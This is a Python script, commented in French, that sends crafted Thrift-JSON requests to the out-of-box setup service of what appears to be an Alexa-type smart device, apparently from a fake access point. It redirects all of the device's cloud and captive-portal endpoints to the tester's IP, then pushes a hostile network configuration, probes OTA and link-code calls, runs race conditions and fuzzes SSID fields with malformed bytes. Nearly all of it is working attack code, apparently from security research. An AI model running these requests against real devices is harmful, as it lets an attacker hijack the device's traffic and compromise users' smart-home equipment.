#!/usr/bin/env python3
"""Tests prioritaires pour la fenêtre setup : captivePortalEndpoint,
connectToAPEx hostile, race conditions. Tout en JSON COMPACT."""
import socket, threading, time, json, sys, struct

TARGET = sys.argv[1] if len(sys.argv) > 1 else "10.201.126.241"
PORT = 8080
LOG = "/tmp/fakeap/oobe_fresh.log"
SEQ = [0]

def log(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    with open(LOG, "a") as f: f.write(line + "\n")
    print(line, flush=True)

def call(method, args="{}", timeout=10, seq=None):
    SEQ[0] += 1
    s = seq if seq is not None else SEQ[0]
    body = json.dumps([1, method, 1, s, json.loads(args) if isinstance(args, str) else args],
                      separators=(",", ":"))
    req = ("POST /OOBE HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: application/x-thrift\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n%s"
           ) % (TARGET, PORT, len(body), body)
    try:
        c = socket.create_connection((TARGET, PORT), timeout=timeout)
        t0 = time.time()
        c.sendall(req.encode())
        buf = b""
        while True:
            d = c.recv(65536)
            if not d: break
            buf += d
        c.close()
        dt = time.time() - t0
        return buf.decode("utf-8", "replace"), dt
    except Exception as e:
        return "ERR:%s" % type(e).__name__, time.time() - t0 if 't0' in dir() else 0

def race_pair(method1, method2, args1="{}", args2="{}"):
    results = [None, None]
    def t1(): results[0] = call(method1, args1, timeout=30, seq=100)
    def t2(): results[1] = call(method2, args2, timeout=30, seq=101)
    th1 = threading.Thread(target=t1)
    th2 = threading.Thread(target=t2)
    th1.start(); th2.start()
    th1.join(timeout=35); th2.join(timeout=35)
    return results

# ================================================================ TEST 1
log("=== TEST 1 : setLocaleAndEndpoints avec TOUS les endpoints vers NOUS ===")
# Rediriger TOUT vers 192.168.50.1 (notre AP)
our_ip = "192.168.50.1"
args = {"1": {"rec": {
    "1": {"str": "en-US"},          # locale
    "2": {"str": "US"},             # country
    "4": {"str": our_ip + ":8080"},  # alexaEndpoint
    "5": {"i32": 8080},              # alexaPort
    "6": {"str": our_ip + ":8080"},  # companionAppEndpoint
    "7": {"i32": 8080},              # companionAppPort
    "8": {"str": our_ip + ":8080"},  # pandaEndpoint
    "9": {"str": our_ip + ":8080"},  # todoEndpoint
    "10": {"str": our_ip + ":8080"}, # FIRSEndpoint
    "11": {"str": "http://" + our_ip + ":8080/captive"}  # captivePortalEndpoint ← http:// explicite !
}}}
r, dt = call("setLocaleAndEndpoints", args, timeout=15)
log("  → (%.1fs) %s" % (dt, r[:250]))

# Si accepté (i32:0), le device a stocké nos endpoints
if '"i32":0' in r:
    log("  ★ ACCEPTÉ — le device a maintenant NOS endpoints. Après connectToAP, il contactera NOS serveurs.")

# ================================================================ TEST 2
log("=== TEST 2 : connectToAPEx avec config IP hostile ===")
args = {"1": {"rec": {"1": {"str": "TEST"}, "3": {"i32": 1}}},  # AP ouvert
        "2": {"rec": {
            "1": {"str": "192.168.50.1"},   # ipaddress = NOTRE IP (conflit !)
            "2": {"str": "255.255.255.255"}, # subnet /32 absurde
            "3": {"str": "192.168.50.254"},  # gateway inexistante
            "4": {"str": "192.168.50.1"}     # DNS = nous (normal)
        }}}
r, dt = call("connectToAPEx", args, timeout=35)
log("  → (%.1fs) %s" % (dt, r[:250]))

# ================================================================ TEST 3
log("=== TEST 3 : getOTADetails avec JSON compact (re-test) ===")
r, dt = call("getOTADetails", "{}", timeout=90)
log("  → (%.1fs) %s" % (dt, r[:250]))

# ================================================================ TEST 4
log("=== TEST 4 : getLinkCode avec JSON compact (re-test) ===")
r, dt = call("getLinkCode", "{}", timeout=90)
log("  → (%.1fs) %s" % (dt, r[:250]))

# ================================================================ TEST 5
log("=== TEST 5 : Race conditions — 2 pings simultanés ===")
r = race_pair("ping", "ping")
log("  r1=%s" % (r[0][0][:80] if r[0] else "TIMEOUT"))
log("  r2=%s" % (r[1][0][:80] if r[1] else "TIMEOUT"))

log("=== TEST 5b : Race — getDeviceDetails + ping ===")
r = race_pair("getDeviceDetails", "ping")
log("  r1=%s" % (r[0][0][:80] if r[0] else "TIMEOUT"))
log("  r2=%s" % (r[1][0][:80] if r[1] else "TIMEOUT"))

log("=== TEST 5c : Race — connexion TCP vide + ping ===")
try:
    dead = socket.create_connection((TARGET, PORT), timeout=3)
    time.sleep(1)
    r, dt = call("ping", "{}", timeout=8)
    log("  ping pendant connexion vide : %s (%.1fs)" % (r[:60], dt))
    dead.close()
except Exception as e:
    log("  connexion vide : %s" % e)

log("=== TEST 5d : Race — 5 connexions simultanées ===")
results = [None] * 5
def tp(i):
    SEQ[0] += 1
    results[i] = call("ping", "{}", timeout=15, seq=200+i)
threads = [threading.Thread(target=tp, args=(i,)) for i in range(5)]
for t in threads: t.start()
for t in threads: t.join(timeout=20)
for i, r in enumerate(results):
    log("  r%d=%s" % (i+1, (r[0][:60] if r else "TIMEOUT")))

# ================================================================ TEST 6
log("=== TEST 6 : disconnectFromAP avec SSID malformé ===")
malformed_ssids = [
    "A" * 253,                       # max 802.11
    "\x00\x01\x02\x03",             # bytes de contrôle
    "test\xFF\xFE\xFD",             # bytes invalides UTF-8
    "a" * 100 + "\x00" + "b" * 100, # NUL au milieu
]
for ssid in malformed_ssids:
    args = {"1": {"str": ssid[:200]}}  # tronquer pour éviter rejet de longueur pure
    r, dt = call("disconnectFromAP", args, timeout=10)
    log("  ssid[%d] → %s" % (len(ssid[:200]), r[:60]))

log("=== FIN — tous les tests prioritaires exécutés ===")
